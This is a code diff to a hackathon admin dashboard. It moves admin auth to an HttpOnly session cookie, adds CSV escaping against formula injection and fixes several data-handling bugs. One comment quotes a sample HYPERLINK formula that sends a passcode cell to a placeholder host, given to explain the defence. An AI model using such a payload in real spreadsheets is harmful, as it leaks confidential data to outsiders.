@@ -36,11 +36,35 @@ import { sound } from '@/audio/soundEffects';
 import confetti from 'canvas-confetti';
 import { PaymentReceiptModal } from '@/components/modals/PaymentReceiptModal';
 
+// Not a credential: a flag saying "this tab logged in", so a reload can try to
+// resume. The real session is the HttpOnly cookie, which JS cannot read.
+const ADMIN_SESSION_HINT = 'orion_admin_session_active';
+
 export interface AdminToast {
   id: string;
   type: 'success' | 'error' | 'warning' | 'info';
   title: string;
   message: string;
+}
+
+/**
+ * Escape one CSV cell.
+ *
+ * Two separate problems this solves:
+ *
+ * 1. Formula injection. Registration is public, so a team can name itself
+ *    `=HYPERLINK("https://evil.tld?d="&V2,"click")` and Excel will execute it
+ *    when an organiser opens the roster — column V is the team passcode. Any
+ *    cell starting with = + - @, tab or CR is prefixed with a single quote,
+ *    which Excel and LibreOffice treat as "this is text".
+ * 2. Delimiter breakage. Several columns were emitted unquoted, so one comma in
+ *    a team name shifted every later column on that row — silently moving the
+ *    passcode under a different heading.
+ */
+function csvCell(value: unknown): string {
+  const s = value === null || value === undefined ? '' : String(value);
+  const neutralised = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return `"${neutralised.replace(/"/g, '""')}"`;
 }
 
 /**
@@ -215,7 +239,18 @@ export default function AdminDashboard() {
     if (team) {
       syncRubricScores(team);
     }
-    setSelectedTeam(team);
+    // Clear drafts tied to the previously open team. `adminNoteInput` persisted
+    // across selections, so a note typed for team A and left unsaved would be
+    // written onto team B on the next SAVE NOTE.
+    setSelectedTeam(prev => {
+      const changed =
+        !team || !prev || (prev.id !== team.id && prev.registration_id !== team.registration_id);
+      if (changed) {
+        setAdminNoteInput(team?.admin_notes || '');
+        setReuploadDecisionNote('');
+      }
+      return team;
+    });
   };
 
   const handleCopyUrl = (url: string, e?: React.MouseEvent) => {
@@ -241,23 +276,29 @@ export default function AdminDashboard() {
   const [teamToDelete, setTeamToDelete] = useState<TeamRecord | null>(null);
 
   // Fetch admin data helper
-  const fetchAdminData = useCallback(async (key: string, isSilent = false) => {
+  // Returns the freshly loaded teams so callers can re-sync the open drawer.
+  // Auth rides on the HttpOnly session cookie set by /api/admin/session, so
+  // nothing here has to hold the admin secret. `credentials: 'same-origin'` is
+  // the default for same-origin fetches but is stated explicitly: this request
+  // is worthless without the cookie.
+  const fetchAdminData = useCallback(async (isSilent = false): Promise<TeamRecord[] | null> => {
     if (!isSilent) setIsLoading(true);
     try {
       const res = await fetch('/api/admin/registrations', {
-        headers: { 'x-admin-key': key }
+        credentials: 'same-origin'
       });
 
       if (res.status === 401) {
-        sessionStorage.removeItem('orion_admin_key');
+        sessionStorage.removeItem(ADMIN_SESSION_HINT);
         setIsAuthenticated(false);
         setAuthError('Session expired. Please enter passcode again.');
-        return;
+        return null;
       }
 
       const json = await res.json();
       if (json.success) {
-        setTeams(json.teams || []);
+        const loadedTeams: TeamRecord[] = json.teams || [];
+        setTeams(loadedTeams);
         setAuditLogs(json.auditLogs || []);
         if (json.config) {
           setConfig(json.config);
@@ -273,37 +314,38 @@ export default function AdminDashboard() {
           round1PendingReview: 0,
           round1Selected: 0,
           round1NotSelected: 0,
+          // Was missing here, so on a stats-less response the RE-UPLOAD REQ tile
+          // rendered `undefined` and pending requests went unnoticed.
+          reuploadRequestsPending: 0,
           totalRevenue: 0,
           countByTrack: {}
         });
         setIsAuthenticated(true);
+        return loadedTeams;
       }
     } catch (err) {
       console.error('Failed to load admin data:', err);
     } finally {
       if (!isSilent) setIsLoading(false);
     }
+    return null;
   }, []);
 
-  // Check saved session in sessionStorage
+  // Restore an existing session after a reload. The cookie is HttpOnly and so
+  // invisible to this code; the sessionStorage flag is only a hint that saves a
+  // pointless round trip for a visitor who never logged in. The server decides.
   useEffect(() => {
-    const savedKey = typeof window !== 'undefined' ? sessionStorage.getItem('orion_admin_key') : null;
-    if (savedKey) {
-      const timer = setTimeout(() => {
-        fetchAdminData(savedKey);
-      }, 0);
-      return () => clearTimeout(timer);
-    }
+    if (typeof window === 'undefined') return;
+    if (!sessionStorage.getItem(ADMIN_SESSION_HINT)) return;
+    const timer = setTimeout(() => { fetchAdminData(); }, 0);
+    return () => clearTimeout(timer);
   }, [fetchAdminData]);
 
   // Real-time polling every 6 seconds when authenticated
   useEffect(() => {
     if (!isAuthenticated) return;
     const interval = setInterval(() => {
-      const savedKey = sessionStorage.getItem('orion_admin_key');
-      if (savedKey) {
-        fetchAdminData(savedKey, true);
-      }
+      fetchAdminData(true);
     }, 6000);
     return () => clearInterval(interval);
   }, [isAuthenticated, fetchAdminData]);
@@ -314,17 +356,22 @@ export default function AdminDashboard() {
     setIsLoading(true);
 
     try {
-      const res = await fetch('/api/admin/registrations', {
+      // Exchange the passcode for a session cookie. The passcode itself is
+      // never stored — it used to sit in sessionStorage as the live value of
+      // ADMIN_SECRET_KEY, readable by any script running on this origin.
+      const res = await fetch('/api/admin/session', {
         method: 'POST',
+        credentials: 'same-origin',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ passcode: passcode.trim() })
       });
 
       const json = await res.json();
       if (res.ok && json.authorized) {
-        sessionStorage.setItem('orion_admin_key', passcode.trim());
+        sessionStorage.setItem(ADMIN_SESSION_HINT, '1');
+        setPasscode('');
         setIsAuthenticated(true);
-        fetchAdminData(passcode.trim());
+        fetchAdminData();
       } else {
         setAuthError(json.error || 'Invalid passcode');
       }
@@ -337,7 +384,10 @@ export default function AdminDashboard() {
 
   const handleLogout = () => {
     sound.playClick();
-    sessionStorage.removeItem('orion_admin_key');
+    sessionStorage.removeItem(ADMIN_SESSION_HINT);
+    // Clear the cookie server-side; dropping local state alone would leave a
+    // live session on a shared machine.
+    fetch('/api/admin/session', { method: 'DELETE', credentials: 'same-origin' }).catch(() => {});
     setIsAuthenticated(false);
     setTeams([]);
   };
@@ -353,7 +403,6 @@ export default function AdminDashboard() {
     note?: string;
     requestId?: string;
   }) => {
-    const key = sessionStorage.getItem('orion_admin_key') || '';
     const actionKey = `${payload.teamId}-${payload.action}-${payload.decision || ''}`;
     setActiveActionKey(actionKey);
     sound.playClick();
@@ -362,10 +411,8 @@ export default function AdminDashboard() {
     try {
       const res = await fetch('/api/admin/registrations', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-admin-key': key
-        },
+        credentials: 'same-origin',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
 
@@ -423,12 +470,17 @@ export default function AdminDashboard() {
         }
         
         // Refresh admin data
-        await fetchAdminData(key, true);
-        
-        // Update currently opened team
-        if (selectedTeam && payload.action !== 'DELETE_TEAM') {
-          const updated = await fetch(`/api/team/portal?teamId=${selectedTeam.registration_id}`).then(r => r.json());
-          if (updated.team) handleSelectTeam(updated.team);
+        const refreshedTeams = await fetchAdminData(true);
+
+        // Re-sync the open drawer from the admin payload. This used to call
+        // /api/team/portal without a team token, which always 401s — so the
+        // drawer silently kept showing pre-action state and admins would
+        // re-click VERIFY thinking it had failed.
+        if (refreshedTeams && selectedTeam && payload.action !== 'DELETE_TEAM') {
+          const updated = refreshedTeams.find(
+            t => t.id === selectedTeam.id || t.registration_id === selectedTeam.registration_id
+          );
+          if (updated) handleSelectTeam(updated);
         }
       } else {
         showToast('error', 'Operation Failed', json.error || 'Operation failed');
@@ -446,15 +498,12 @@ export default function AdminDashboard() {
   // Save System Settings
   const handleSaveSettings = async (e: React.FormEvent) => {
     e.preventDefault();
-    const key = sessionStorage.getItem('orion_admin_key') || '';
     setIsSavingSettings(true);
     try {
       const res = await fetch('/api/admin/config', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-admin-key': key
-        },
+        credentials: 'same-origin',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ config: settingsForm })
       });
       const data = await res.json();
@@ -510,16 +559,16 @@ export default function AdminDashboard() {
 
       return [
         t.registration_id,
-        `"${t.team_name.replace(/"/g, '""')}"`,
+        t.team_name,
         t.problem_statement,
-        `"${t.leader_name.replace(/"/g, '""')}"`,
-        `"${t.leader_phone}"`,
+        t.leader_name,
+        t.leader_phone,
         t.leader_email,
-        `"${t.institution.replace(/"/g, '""')}"`,
-        `"${t.department || ''}"`,
-        `"${t.year || ''}"`,
+        t.institution,
+        t.department || '',
+        t.year || '',
         t.payment_status,
-        `"${t.payment?.utr_number || ''}"`,
+        t.payment?.utr_number || '',
         t.round_1_status,
         t.round_2_status,
         totalScore,
@@ -531,21 +580,27 @@ export default function AdminDashboard() {
         scores?.feasibility ?? '',
         t.members.length + 1,
         t.access_token,
-        `"${latestSub?.file_url || ''}"`,
-        `"${latestSub?.project_url || ''}"`,
-        `"${latestSub?.repo_url || ''}"`,
+        latestSub?.file_url || '',
+        latestSub?.project_url || '',
+        latestSub?.repo_url || '',
         t.created_at ? t.created_at.split('T')[0] : ''
-      ];
+      ].map(csvCell);
     });
 
-    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
-    const encodedUri = encodeURI(csvContent);
+    const csvContent = [headers.map(csvCell).join(','), ...rows.map(e => e.join(','))].join('\r\n');
+
+    // A Blob, not a data: URI. `encodeURI` leaves '#' unescaped, so a team named
+    // "Team #1" silently truncated the download at that row; data: URIs also cap
+    // out around 2 MB.
+    const blob = new Blob(['﻿' + csvContent], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
-    link.setAttribute('href', encodedUri);
+    link.setAttribute('href', url);
     link.setAttribute('download', `ORION_Hackathon_Roster_${new Date().toISOString().split('T')[0]}.csv`);
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+    URL.revokeObjectURL(url);
   };
 
   // Filtered Teams
@@ -603,10 +658,7 @@ export default function AdminDashboard() {
             {isAuthenticated ? (
               <>
                 <button
-                  onClick={() => {
-                    const key = sessionStorage.getItem('orion_admin_key') || '';
-                    fetchAdminData(key);
-                  }}
+                  onClick={() => { fetchAdminData(); }}
                   className="p-2 bg-[#040E24] border border-white/10 text-[#38BDF8] hover:bg-[#07193D] transition-colors text-xs font-mono flex items-center gap-1.5 cursor-pointer"
                   title="Sync Live Records"
                 >
@@ -1347,7 +1399,12 @@ export default function AdminDashboard() {
 
                               <a
                                 href={
-                                  latestSub.file_url.toLowerCase().endsWith('.pdf')
+                                  // Test the stored filename, not the link:
+                                  // file_url is now a signed URL carrying a
+                                  // ?token=, so it never ends in ".pdf" and
+                                  // every PDF was being bounced through the
+                                  // Google viewer.
+                                  latestSub.original_filename.toLowerCase().endsWith('.pdf')
                                     ? latestSub.file_url
                                     : `https://docs.google.com/viewer?url=${encodeURIComponent(latestSub.file_url)}&embedded=true`
                                 }
